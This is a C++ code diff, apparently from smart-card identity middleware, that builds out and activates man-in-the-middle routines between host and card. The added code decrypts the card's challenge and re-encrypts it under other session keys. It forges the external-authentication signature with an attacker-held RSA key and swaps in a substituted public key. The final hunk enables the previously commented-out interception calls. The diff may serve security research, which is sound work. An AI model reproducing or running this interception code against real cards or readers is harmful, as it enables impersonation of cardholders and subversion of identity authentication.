@@ -93,7 +93,18 @@ uint8_t VerifyCert1[] = { 0x1c, 0x2A, 0x00, 0xAE };
 uint8_t VerifyCert2[] = { 0x0c, 0x2A, 0x00, 0xAE };
 uint8_t SetCHR[] = { 0x0c, 0x22, 0x81, 0xA4 };
 uint8_t GetChallenge[] = { 0x0c, 0x84, 0x00, 0x00 };
+uint8_t ExtAuth1[] = { 0x1c, 0x82, 0x00, 0x00 };
+uint8_t ExtAuth2[] = { 0x0c, 0x82, 0x00, 0x00 };
+uint8_t IntAuth[] = { 0x0c, 0x22, 0x41, 0xa4 };
+uint8_t GiveRandom[] = { 0x0c, 0x88, 0x00, 0x00 };
+
+uint8_t sn_icc[] = { 0x00, 0x68, 0x37, 0x56, 0x18, 0x03, 0x30, 0x1f };
 BYTE certenc[354] = {};
+BYTE buffer_resp[293] = {};
+ByteDynArray challenge;
+ByteDynArray chResponse;
+uint8_t snIFD[] = { 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01 };
+ByteArray snIFDBa = VarToByteArray(snIFD);
 
 void increment(ByteArray &seq) {
 	for (size_t i = seq.size() - 1; i >= 0; i--) {
@@ -377,6 +388,87 @@ void mitm_out(BYTE *apdu, DWORD apduSize, SCARDHANDLE hCard, const SCARD_IO_REQU
 
 			LOG_DEBUG("apdu modified:");
 			LOG_BUFFER(smApdu.data(), smApdu.size());
+		} else if (memcmp(apdu, ExtAuth1, 4) == 0) {
+			ByteDynArray toHash, toSign;
+			size_t padSize = 222;
+			ByteDynArray PRND(padSize);
+			PRND.random();
+			toHash.set(&PRND, &dh_pubKey_mitm, &snIFDBa, &challenge, &dh_ICCpubKey, &dh_g, &dh_p, &dh_q);
+    		ByteDynArray toHashBa = sha256.Digest(toHash);
+			toSign.set(0x6a, &PRND, &toHashBa, 0xBC);
+		
+			CRSA certKey(module, privexp);
+		
+			ByteDynArray signResp = certKey.RSA_PURE(toSign);
+			chResponse.set(&snIFDBa, &signResp);
+
+			BYTE supp[231];
+			memcpy(supp,chResponse.data(),231);
+			ByteArray data = VarToByteArray(supp);
+			ByteArray emptyBa;
+			ByteDynArray smApdu;
+			uint8_t le = 0;
+			BYTE head[] = { 0x10, 0x82, 0x00, 0x00 };
+			ByteArray headBa = VarToByteArray(head);
+			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
+			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
+			memcpy(apdu, smApdu.data(), smApdu.size());
+			LOG_DEBUG("Remaining: %d", chResponse.size()-231);
+		} else if (memcmp(apdu, ExtAuth2, 4) == 0) {
+			BYTE supp[33];
+			memcpy(supp,chResponse.data() + 231,33);
+			ByteArray data = VarToByteArray(supp);
+			ByteArray emptyBa;
+			ByteDynArray smApdu;
+			uint8_t le = 0;
+			BYTE head[] = { 0x00, 0x82, 0x00, 0x00 };
+			ByteArray headBa = VarToByteArray(head);
+			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
+			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
+			memcpy(apdu, smApdu.data(), smApdu.size());
+		} else if (memcmp(apdu, IntAuth, 4) == 0) {
+			ByteDynArray iv(8);
+			iv.fill(0);
+			CDES3 encDes(sessENC_IFD, iv);
+			BYTE supp[8];
+			memcpy(supp,apdu+8,8);
+			ByteArray encData = VarToByteArray(supp);
+			ByteDynArray data = encDes.RawDecode(encData);
+			data.resize(RemoveISOPad(data),true);
+			LOG_DEBUG("data dec:");
+			LOG_BUFFER(data.data(), data.size());
+
+			ByteArray emptyBa;
+			ByteDynArray smApdu;
+			uint8_t le = 0;
+			BYTE head[] = { 0x00, 0x22, 0x41, 0xa4 };
+			ByteArray headBa = VarToByteArray(head);
+			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
+			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
+			memcpy(apdu, smApdu.data(), smApdu.size());
+		} else if (memcmp(apdu, GiveRandom, 4) == 0) {
+			ByteDynArray iv(8);
+			iv.fill(0);
+			CDES3 encDes(sessENC_IFD, iv);
+			BYTE supp[16];
+			memcpy(supp,apdu+8,16);
+			ByteArray encData = VarToByteArray(supp);
+			ByteDynArray data = encDes.RawDecode(encData);
+			data.resize(RemoveISOPad(data),true);
+			LOG_DEBUG("data dec:");
+			LOG_BUFFER(data.data(), data.size());
+
+			ByteArray emptyBa;
+			ByteDynArray smApdu;
+			uint8_t le = 0;
+			BYTE head[] = { 0x00, 0x88, 0x00, 0x00 };
+			ByteArray headBa = VarToByteArray(head);
+			smApdu.set(&headBa, (uint8_t)data.size(), &data, &emptyBa);
+			smApdu = SM(sessENC_ICC, sessMAC_ICC, smApdu, sessSSC_ICC);
+			memcpy(apdu, smApdu.data(), smApdu.size());
+
+			LOG_DEBUG("apdu modified:");
+			LOG_BUFFER(smApdu.data(), smApdu.size());
 		}
 		
 		break;
@@ -385,7 +477,7 @@ void mitm_out(BYTE *apdu, DWORD apduSize, SCARDHANDLE hCard, const SCARD_IO_REQU
 	}
 }
 
-void mitm_in(BYTE *resp, DWORD respSize) {
+void mitm_in(BYTE *resp, DWORD *respSize) {
 	switch (stage) {
 	case START:
 		break;
@@ -394,11 +486,11 @@ void mitm_in(BYTE *resp, DWORD respSize) {
 		if (memcmp(curr_apdu, adpu_PubKey1, 5) == 0) {
 			// substitute from 9 for respSize-11
 			// with the first respSize-8 bytes of defModule
-			memcpy(resp+9, defModule, respSize-11);
+			memcpy(resp+9, defModule, (*respSize)-11);
 		}else if (memcmp(curr_apdu, adpu_PubKey2, 5) == 0) {
 			// substitute from 0 for respSize-2
 			// with respSize-2 bytes of defModule+119
-			memcpy(resp, defModule+119, respSize-2);
+			memcpy(resp, defModule+119, (*respSize)-2);
 		}else if (memcmp(curr_apdu, adpu_PubKey3, 5) == 0) {
 			// substitute from 0 for 9
 			// with 9 bytes of defModule+247
@@ -409,10 +501,10 @@ void mitm_in(BYTE *resp, DWORD respSize) {
 	case INIT_DH_PARAM:
 		LOG_DEBUG("INIT_DH_PARAM");
 		if (memcmp(curr_apdu, apdu_getDHDuopData_g, 17) == 0) {
-			memcpy(dh_gBytes, resp+18, respSize-20);
+			memcpy(dh_gBytes, resp+18, (*respSize)-20);
 		}
 		if (memcmp(curr_apdu, apdu_getDHDuopData_p, 17) == 0) {
-			memcpy(dh_pBytes, resp+18, respSize-20);
+			memcpy(dh_pBytes, resp+18, (*respSize)-20);
 		}
 		if (memcmp(curr_apdu, apdu_getDHDuopData_q, 17) == 0) {
 			BYTE temp[42] = {};
@@ -439,7 +531,6 @@ void mitm_in(BYTE *resp, DWORD respSize) {
 
 		break;
 	case DH_KEY_EXCHANGE:
-	//TO FIX this sessENC_IFD != sessENC
 		LOG_DEBUG("DH_KEY_EXCHANGE");
 		if (memcmp(curr_apdu, apdu_GET_DATA_Data1, 11) == 0) {
 			//do {
@@ -491,8 +582,47 @@ void mitm_in(BYTE *resp, DWORD respSize) {
 		}
 		break;
 	case DAPP:
-			{   
-				LOG_BUFFER(resp, respSize);
+			if (memcmp(curr_apdu, GetChallenge, 4) == 0) {
+				
+				ByteDynArray iv(8);
+				iv.fill(0);
+				CDES3 encDes_ICC(sessENC_ICC, iv);
+				BYTE tmp[16] = {};
+				memcpy(tmp, resp+3, 16);
+				
+				ByteArray encData;
+				encData = VarToByteArray(tmp);
+				LOG_DEBUG("encData:");
+				LOG_BUFFER(encData.data(), encData.size());
+				challenge = encDes_ICC.RawDecode(encData);
+				challenge.resize(RemoveISOPad(challenge),true);
+				LOG_DEBUG("Challenge:");
+				LOG_BUFFER(challenge.data(), challenge.size());
+				//crafting the response
+				increment(sessSSC_ICC);
+				increment(sessSSC_IFD);
+				CDES3 encDes_IFD(sessENC_IFD, iv);
+				CMAC sigMac_IFD(sessMAC_IFD, iv);
+				ByteDynArray encChallenge;
+				encChallenge = encDes_IFD.RawEncode(ISOPad(challenge));
+				ByteDynArray datafield;
+				uint8_t Val01 = 1;
+				datafield.setASN1Tag(0x87, VarToByteDynArray(Val01).append(encChallenge));
+				ByteDynArray calcMac = sessSSC_IFD;
+				uint8_t macTail[4] = { 0x99, 0x02, 0x90, 0x00 };
+				calcMac.append(datafield).append(VarToByteDynArray(macTail));
+				auto smMac = sigMac_IFD.Mac(ISOPad(calcMac));
+				uint8_t sw[2] = {0x90, 0x00};
+				ByteDynArray respBa;
+				ByteDynArray swBa = VarToByteDynArray(sw);
+				ByteDynArray data;
+				data = datafield.append(VarToByteDynArray(macTail));
+				ByteDynArray ccfb;
+				ccfb.setASN1Tag(0x8e, smMac);
+				respBa.set(&data, &ccfb, &swBa);
+				memcpy(resp, respBa.data(), *respSize);
+			} else {
+				LOG_BUFFER(resp, *respSize);
 				BYTE temp[16] = {};
 				memcpy(temp, resp, 16); 
 				ByteDynArray respBa = VarToByteArray(temp);
@@ -553,9 +683,9 @@ int TokenTransmitCallback(CSlot *data, BYTE *apdu, DWORD apduSize, BYTE *resp, D
                   
 	//ODS(String().printf("APDU: %s\n", dumpHexData(ByteArray(apdu, apduSize), String()).lock()).lock());
 	// START MITM
-    //mitm_out(apdu, apduSize, data->hCard, SCARD_PCI_T1);
+    mitm_out(apdu, apduSize, data->hCard, SCARD_PCI_T1);
 	auto ris = SCardTransmit(data->hCard, SCARD_PCI_T1, apdu, apduSize, NULL, resp, respSize);
-    //mitm_in(resp, *respSize);
+    mitm_in(resp, respSize);
 	// END MITM
     
 	LOG_DEBUG("TokenTransmitCallback - Smart card response:");
